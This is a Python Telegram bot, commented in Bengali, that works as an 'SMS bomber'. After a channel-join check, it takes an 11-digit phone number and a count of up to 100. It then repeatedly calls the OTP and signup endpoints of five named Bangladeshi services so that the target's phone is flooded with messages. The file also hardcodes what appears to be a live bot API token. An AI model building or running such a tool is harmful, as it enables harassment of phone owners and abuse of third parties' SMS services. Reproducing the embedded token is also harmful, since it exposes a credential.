import telebot
import requests
import time
from telebot import types
from flask import Flask
from threading import Thread

# ১. সেটিংস
API_TOKEN = '8678067992:AAH-gaEdP_KdS47FefM1G-Tl5HI0Wb1PQHM'
CHANNEL_USERNAME = '@developer_of_maruf' 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}
verified_users = set()

app = Flask('')
@app.route('/')
def home(): return "Server is Running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# ২. স্টার্ট কমান্ড ও ভেরিফিকেশন (একবারই আসবে)
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        if chat_id not in verified_users:
            bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
            verified_users.add(chat_id)
            time.sleep(1)
        
        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন নাম্বারটি দিন (১১ ডিজিট):")
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("✅ Verify Done", callback_data="verify_join"))
        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)

# ৩. কঠোর ১১ ডিজিট চেক
def get_number(message):
    num = message.text
    if num == "/start":
        welcome(message)
        return
    
    if not num.isdigit() or len(num) != 11:
        msg = bot.send_message(message.chat.id, "⚠️ ভুল নাম্বার! ১১ ডিজিটের সঠিক নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
        
    user_data[message.chat.id] = num
    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (১-১০০):")
    bot.register_next_step_handler(msg, send_bomber)

# ৪. বোম্বিং প্রসেস (ধীরে ধীরে SMS যাবে)
def send_bomber(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]
        if amount > 100: amount = 100 
        
        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
        
        for i in range(amount):
            try:
                # একাধিক API সোর্স (যাতে ১০-২০টার বেশি SMS যায়)
                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
                requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, timeout=5)
                requests.post("https://api.pathao.com/v1/auth/otp/send", data={"phone": num}, timeout=5)
                requests.post("https://chaldal.com/api/customer/LoginOTP", json={"PhoneNumber": num}, timeout=5)
                requests.get(f"https://fundesh.com.bd/api/auth/send-otp?phone={num}", timeout=5)
                
                # আপনি যেমন চেয়েছেন - ধীরে ধীরে পাঠানোর জন্য ২ সেকেন্ড বিরতি
                time.sleep(2) 
            except:
                continue
                
        # আপনার পছন্দের সেই পুরনো লেখা
        bot.send_message(message.chat.id, "✅ কাজ শেষ!")
    except:
        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(skip_pending=True)
